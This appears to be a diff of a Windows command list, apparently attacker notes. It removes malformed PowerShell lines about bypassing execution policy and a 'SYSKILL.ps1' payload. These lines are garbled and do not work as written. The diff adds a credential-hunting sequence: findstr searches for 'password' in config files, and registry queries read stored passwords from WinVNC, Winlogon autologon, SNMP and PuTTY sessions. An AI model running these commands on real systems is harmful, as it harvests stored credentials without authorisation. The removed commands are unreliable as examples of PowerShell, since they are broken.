@@ -1,11 +1,15 @@
-GenPat ./SYSKILL.ps1
-Get-ChildItem-Generate ./SYSKILL.ps1
-Set-ExecutionPolicy Bypass CurrentUser
-Set-ItemProperty Bypass
-Set-PackageSource C:\Users\1337Haxxor\Documents\Bypass\CurrentUser\SYSKILL.ps1
-Set-ExecutionPolicy Unrestricted CurrentUser C:\Users\1337Haxxor\Documents\CurrentUser\Payload\
-Set-ExecutionPolicy Unrestricted Process C:\Users\1337Haxxor\Documents\CurrentUser\SYSKILL.ps1
-Set-Variable ExecutionContext ./SYSKILL.ps1 C:\Users\1337Haxxor\Documents\CurrentUser\SYSKILL.ps1
-Set-Variable Host ./SYSKILL.ps1 C:\Users\1337Haxxor\Documents\CurrentUser\SYSKILL.ps1\Payload\
-Add-Content SYSKILL ./SYSKILL.ps1 C:\Users\1337Haxxor\Documents\CurrentUser\SYSKILL.ps1\Payload\
-Register-EditorCommand ./SYSKILL.ps1 C:\Users\1337Haxxor\Documents\CurrentUser\SYSKILL.ps1\Payload\
+ls
+type example.txt
+$items = Get-ChildItem
+cd $items[4].FullName
+cat *.txt
+cd *
+cat 1*
+tree /F
+findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.gif *.ps1 *.yml
+reg query "HKLM /f password /t REG_SZ /s"
+reg query "HKCU /f password /t REG_SZ /s"
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP"
+reg query "HKCU\SOFTWARE\1337Haxxor\PuTTY\Sessions"
